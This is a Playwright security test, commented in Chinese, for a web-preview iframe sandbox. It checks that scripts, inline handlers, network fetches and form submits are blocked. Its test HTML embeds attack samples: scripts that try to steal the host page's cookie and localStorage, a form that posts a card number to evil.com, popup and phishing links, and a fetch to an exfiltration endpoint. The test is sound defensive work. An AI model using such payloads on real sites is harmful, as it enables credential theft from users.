import assert from 'node:assert/strict'
import fs from 'node:fs'
import http from 'node:http'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { chromium, type Browser } from 'playwright'
import { buildWebPreviewDocument } from '../src/utils/webPreviewDocument'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const distDir = path.resolve(__dirname, '../dist')

console.log('=== [Playwright 真实浏览器] 验证沙箱隔离与安全档位 ===')

// 1. 启动轻量本地真实 HTTP 宿主服务器，提供真实的同源/跨源网络宿主环境与构建静态资源托管
const hostPort = 39871
let exfiltrateRequestCount = 0

const server = http.createServer((req, res) => {
    // 关键加固 1：主动配置全开放 CORS 响应头，确保测试即使允许跨域也绝不能绕过 CSP connect-src 'none' 的物理断网
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE')
    res.setHeader('Access-Control-Allow-Headers', '*')

    if (req.method === 'OPTIONS') {
        res.writeHead(204)
        res.end()
        return
    }

    const reqUrl = req.url || '/'

    // 关键加固 2：外联测试接口计数，断言受限沙箱即使发起 fetch，也绝对不会产生网络请求到达
    if (reqUrl.includes('/exfiltrate-data')) {
        exfiltrateRequestCount++
        res.writeHead(200, { 'Content-Type': 'application/json' })
        res.end(JSON.stringify({ status: 'exfiltrated' }))
        return
    }

    // 关键加固 3：支持静态托管构建产物（dist 目录），用于端到端真实验证 preview-isolated.html 新标签页全链路
    if (reqUrl.startsWith('/ai/') || reqUrl.startsWith('/preview-isolated.html') || reqUrl.startsWith('/assets/')) {
        let relativePath = reqUrl.replace(/^\/ai\//, '/').split('?')[0].split('#')[0]
        if (relativePath.startsWith('/')) relativePath = relativePath.slice(1)
        const filePath = path.join(distDir, relativePath)

        if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
            const ext = path.extname(filePath).toLowerCase()
            const mimeTypes: Record<string, string> = {
                '.html': 'text/html; charset=utf-8',
                '.js': 'application/javascript; charset=utf-8',
                '.css': 'text/css; charset=utf-8',
                '.json': 'application/json; charset=utf-8',
                '.woff': 'font/woff',
                '.woff2': 'font/woff2',
                '.ttf': 'font/ttf',
            }
            res.writeHead(200, { 'Content-Type': mimeTypes[ext] || 'application/octet-stream' })
            fs.createReadStream(filePath).pipe(res)
            return
        }
    }

    // 宿主主页
    res.writeHead(200, {
        'Content-Type': 'text/html; charset=utf-8',
        'Set-Cookie': 'host_secret_cookie=SUPER_SENSITIVE_SESSION_TOKEN_12345; Path=/; SameSite=Lax',
    })
    res.end(`<!DOCTYPE html>
<html>
<head><title>Host Page</title></head>
<body>
  <h1>宿主信任域测试主页</h1>
  <div id="preview-mount"></div>
</body>
</html>`)
})

await new Promise<void>((resolve) => server.listen(hostPort, '127.0.0.1', () => resolve()))
console.log(`[Host] 测试宿主服务已启动于 http://127.0.0.1:${hostPort}`)

let browser: Browser | null = null
try {
    try {
        browser = await chromium.launch({ channel: 'msedge', headless: true })
    } catch {
        browser = await chromium.launch({ headless: true })
    }
} catch (launchError) {
    server.close()
    console.error('❌ 无法启动真实浏览器进行沙箱集成验证，测试依赖缺失:', launchError)
    process.exit(1)
}

try {
    const context = await browser.newContext()
    const page = await context.newPage()

    // 访问宿主页面并预置敏感凭据与存储
    await page.goto(`http://127.0.0.1:${hostPort}`)
    await page.evaluate(() => {
        localStorage.setItem('host_storage_token', 'SECRET_LOCAL_STORAGE_CREDENTIAL_ABC')
        sessionStorage.setItem('host_session_token', 'SECRET_SESSION_STORAGE_CREDENTIAL_XYZ')
    })

    console.log('\n--- 1. 验证默认安全静态模式 (sandbox="", allowScripts=false) ---')
    const staticUserCode = `<!DOCTYPE html>
<html>
<body>
  <h1 id="heading">Static Title</h1>
  <script>window.staticScriptExecuted = true;</script>
  <button id="static-btn" onclick="window.staticHandlerExecuted = true;">按钮</button>
  <a id="ext-link" href="https://evil.com/phish" target="_blank">外部链接</a>
</body>
</html>`

    const staticCompiledDoc = buildWebPreviewDocument(staticUserCode, {
        allowScripts: false,
    })

    // 在真实宿主页面挂载 static iframe
    await page.evaluate((doc) => {
        const mount = document.getElementById('preview-mount')!
        mount.innerHTML = ''
        const iframe = document.createElement('iframe')
        iframe.id = 'sandbox-static-frame'
        iframe.sandbox = ''
        iframe.srcdoc = doc
        mount.appendChild(iframe)
    }, staticCompiledDoc)

    await page.waitForTimeout(300)
    const staticFrameLocator = page.frameLocator('#sandbox-static-frame')
    const headingText = await staticFrameLocator.locator('#heading').innerText()
    assert.strictEqual(headingText, 'Static Title', '静态模式下正常展示 HTML 文本')

    // 断言 1：宿主域尝试直接访问沙箱 iframe 属性时，被浏览器原生 SecurityError 阻断（来源隔离生效）
    const hostAccessBlocked = await page.evaluate(() => {
        try {
            const frame = (document.getElementById('sandbox-static-frame') as HTMLIFrameElement).contentWindow
            void frame?.location.href
            return 'unblocked'
        } catch (e: any) {
            return e.name
        }
    })
    assert.strictEqual(hostAccessBlocked, 'SecurityError', '宿主由于跨源沙箱隔离，无法直接读取 iframe 内部私有属性')

    // 断言 2：静态模式下内联 onclick 属性必须被剥离且不可执行
    await staticFrameLocator.locator('#static-btn').click()
    const staticFrameObj = page.frames().find(f => f !== page.mainFrame())!
    const staticScriptRan = await staticFrameObj.evaluate(() => (window as any).staticScriptExecuted)
    const staticHandlerRan = await staticFrameObj.evaluate(() => (window as any).staticHandlerExecuted)
    assert.strictEqual(staticScriptRan, undefined, '静态模式下 <script> 绝不能执行')
    assert.strictEqual(staticHandlerRan, undefined, '静态模式下内联 onclick 属性必须被剥离且不可执行')

    console.log('✅ 静态模式验证通过：HTML 正常渲染，宿主隔离生效，脚本与内联事件完全禁止！')

    console.log('\n--- 2. 验证受限沙箱交互模式 (sandbox="allow-scripts", 无 allow-same-origin) ---')
    const interactiveUserCode = `<!DOCTYPE html>
<html>
<body>
  <div id="interactive-marker">Interactive Loaded</div>
  <form id="steal-form" action="https://evil.com/steal" method="POST">
    <input name="credit_card" value="1234-5678">
    <button id="submit-btn" type="submit">Submit</button>
  </form>
  <script>
    window.interactiveScriptRan = true;

    // 攻击尝试 1：跨域/沙箱逃逸窃取宿主 Cookie
    try {
      window.stolenCookie = window.parent.document.cookie;
    } catch (e) {
      window.stolenCookieError = e.name;
    }

    // 攻击尝试 2：窃取宿主 localStorage
    try {
      window.stolenStorage = window.parent.localStorage.getItem('host_storage_token');
    } catch (e) {
      window.stolenStorageError = e.name;
    }

    // 攻击尝试 3：弹窗逃逸
    try {
      window.openResult = window.open('https://evil.com/popup');
    } catch (e) {
      window.openResult = 'thrown';
    }
  </script>
</body>
</html>`

    const interactiveCompiledDoc = buildWebPreviewDocument(interactiveUserCode, {
        allowScripts: true,
        previewId: 'browser-test-interactive',
        injectConsoleBridge: true,
    })

    // 在真实宿主页面挂载 interactive iframe
    await page.evaluate((doc) => {
        const mount = document.getElementById('preview-mount')!
        mount.innerHTML = ''
        const iframe = document.createElement('iframe')
        iframe.id = 'sandbox-interactive-frame'
        iframe.sandbox = 'allow-scripts' // 严禁设置 allow-same-origin
        iframe.srcdoc = doc
        mount.appendChild(iframe)
    }, interactiveCompiledDoc)

    await page.waitForTimeout(400)
    const interactiveFrameLocator = page.frameLocator('#sandbox-interactive-frame')
    const markerText = await interactiveFrameLocator.locator('#interactive-marker').innerText()
    assert.strictEqual(markerText, 'Interactive Loaded', '交互沙箱正常加载')

    // 断言 3：交互模式下内联脚本可以正常执行，但宿主凭据完全隔离
    const evalResults = await page.evaluate(() => {
        const frameEl = document.getElementById('sandbox-interactive-frame') as HTMLIFrameElement
        return {
            sandboxAttr: frameEl.getAttribute('sandbox') || '',
        }
    })
    assert.ok(evalResults.sandboxAttr.includes('allow-scripts'), 'iframe 包含 allow-scripts')
    assert.ok(!evalResults.sandboxAttr.includes('allow-same-origin'), 'iframe 绝对严禁包含 allow-same-origin')

    // 在沙箱 iframe 内部执行断言
    const interactiveFrameObj = page.frames().find(f => f !== page.mainFrame())!
    const attackResults = await interactiveFrameObj.evaluate(() => {
        const win = window as any
        return {
            interactiveScriptRan: win.interactiveScriptRan,
            stolenCookie: win.stolenCookie,
            stolenCookieError: win.stolenCookieError,
            stolenStorage: win.stolenStorage,
            stolenStorageError: win.stolenStorageError,
            openResult: win.openResult,
        }
    })

    assert.strictEqual(attackResults.interactiveScriptRan, true, '交互模式脚本已正常运行')
    assert.strictEqual(attackResults.stolenCookie, undefined, '沙箱脚本绝不能直接读取宿主 Cookie')
    assert.strictEqual(attackResults.stolenCookieError, 'SecurityError', '尝试访问宿主 document.cookie 必须被浏览器抛出 SecurityError 阻断')
    assert.strictEqual(attackResults.stolenStorage, undefined, '沙箱脚本绝不能直接读取宿主 localStorage')
    assert.strictEqual(attackResults.stolenStorageError, 'SecurityError', '尝试访问宿主 localStorage 必须被浏览器抛出 SecurityError 阻断')
    assert.strictEqual(attackResults.openResult, null, 'window.open 调用必须被拦截并返回 null')

    console.log('✅ 宿主隔离验证通过：宿主 Cookie 与 Storage 访问被浏览器 SecurityError 彻底阻断，window.open 逃逸被拦截！')

    console.log('\n--- 3. 验证 CSP 网络外联阻断与表单拦截 ---')
    // 断言 4：在沙箱内发起外部网络请求 (fetch)，确认被 CSP connect-src 'none' 强力拦截
    exfiltrateRequestCount = 0
    const fetchBlocked = await interactiveFrameObj.evaluate(async () => {
        try {
            await fetch('http://127.0.0.1:39871/exfiltrate-data')
            return false // 未被拦截
        } catch {
            return true // 被 CSP 或网络策略成功拦截
        }
    })
    assert.strictEqual(fetchBlocked, true, 'iframe 内部主动向外发起 fetch 请求必须被 CSP connect-src none 严格阻断')
    assert.strictEqual(exfiltrateRequestCount, 0, '受 CSP connect-src none 拦截，即便后端允许 CORS，也绝不能收到任何外发请求')

    // 断言 5：表单提交被全局拦截防护
    const formSubmitBlocked = await interactiveFrameObj.evaluate(() => {
        const form = document.getElementById('steal-form') as HTMLFormElement
        const event = new Event('submit', { bubbles: true, cancelable: true })
        const notCancelled = form.dispatchEvent(event)
        return !notCancelled // true 表示已经被 preventDefault 拦截
    })
    assert.strictEqual(formSubmitBlocked, true, '表单提交必须在捕获阶段被拦截 (defaultPrevented === true)')

    console.log('✅ 策略阻断验证通过：CSP 成功阻断 fetch 外联，服务器收到请求计数为 0，表单提交被完全拦截！')

    console.log('\n--- 4. 验证真实新标签页全链路独立沙箱 (preview-isolated.html + localStorage 阅后即焚) ---')

    // 1. 在当前宿主域中预写入一次性 Token（模拟 WebPreviewModal.vue 点击“新标签页”时的行为）
    const tokenKey = 'prev_' + Math.random().toString(36).slice(2) + Date.now().toString(36)
    const testSecretCode = '<div id="isolated-secret-heading">Isolated New Tab Rendered Successfully</div>'

    await page.evaluate(({ token, code }) => {
        localStorage.setItem(token, JSON.stringify({
            code: code,
            allowScripts: false,
            timestamp: Date.now(),
        }))
    }, { token: tokenKey, code: testSecretCode })

    // 2. 模拟新标签页打开生产构建的 preview-isolated.html
    const newTabPage = await context.newPage()
    await newTabPage.goto(`http://127.0.0.1:${hostPort}/ai/preview-isolated.html#token=${encodeURIComponent(tokenKey)}`)

    // 3. 等待独立沙箱包装页中的 iframe 与脚本加载完成
    await newTabPage.waitForSelector('#sandbox-frame')
    const isolatedFrameLocator = newTabPage.frameLocator('#sandbox-frame')
    await isolatedFrameLocator.locator('#isolated-secret-heading').waitFor({ state: 'visible', timeout: 3000 })

    const renderedSecretText = await isolatedFrameLocator.locator('#isolated-secret-heading').innerText()
    assert.strictEqual(renderedSecretText, 'Isolated New Tab Rendered Successfully', '新标签页必须成功通过一次性 Token 解码并渲染源码')

    // 4. 断言“阅后即焚”：消费后 localStorage 内的 token 必须立即被销毁
    const tokenAfterConsumption = await newTabPage.evaluate((token) => {
        return localStorage.getItem(token)
    }, tokenKey)
    assert.strictEqual(tokenAfterConsumption, null, '一次性预览 Token 在被读取并渲染后必须立即从 localStorage 销毁 (阅后即焚)')

    // 5. 断言初始安全状态（默认静态无脚本模式）
    const initialBadge = await newTabPage.locator('#sandbox-badge').innerText()
    assert.ok(initialBadge.includes('默认安全静态预览'), '新标签页默认初始必须处于静态安全档位')

    const initialIframeSandbox = await newTabPage.evaluate(() => {
        const frame = document.getElementById('sandbox-frame') as HTMLIFrameElement
        return frame.getAttribute('sandbox') || ''
    })
    assert.strictEqual(initialIframeSandbox, '', '新标签页默认初始 iframe sandbox 必须为空')

    // 6. 测试在独立包装页上切换为交互模式
    await newTabPage.locator('#toggle-script-btn').click()
    await newTabPage.waitForTimeout(200)

    const toggledBadge = await newTabPage.locator('#sandbox-badge').innerText()
    assert.ok(toggledBadge.includes('受限沙箱交互'), '切换后徽标应显示为受限沙箱交互')

    const toggledIframeSandbox = await newTabPage.evaluate(() => {
        const frame = document.getElementById('sandbox-frame') as HTMLIFrameElement
        return frame.getAttribute('sandbox') || ''
    })
    assert.strictEqual(toggledIframeSandbox, 'allow-scripts', '切换交互模式后 iframe sandbox 必须严格包含 allow-scripts')

    // 7. 测试无有效 Token 时的降级提示
    const invalidTokenPage = await context.newPage()
    await invalidTokenPage.goto(`http://127.0.0.1:${hostPort}/ai/preview-isolated.html`)
    await invalidTokenPage.waitForSelector('#sandbox-frame')
    const invalidFrameLocator = invalidTokenPage.frameLocator('#sandbox-frame')
    const fallbackText = await invalidFrameLocator.locator('body').innerText()
    assert.ok(fallbackText.includes('未检测到有效的一次性预览源码凭证'), '缺少有效 Token 时必须展示友好安全降级提示')

    await newTabPage.close()
    await invalidTokenPage.close()
    console.log('✅ 新标签页全链路验证通过：Vite 产物路径正确、localStorage 一次性 Token 阅后即焚、沙箱状态切换与空凭证降级全部通过！')

} finally {
    if (browser) await browser.close()
    server.close()
}

console.log('\n========================================')
console.log('🎉 Playwright 真实浏览器沙箱与安全隔离验证全部通过！')
console.log('========================================')
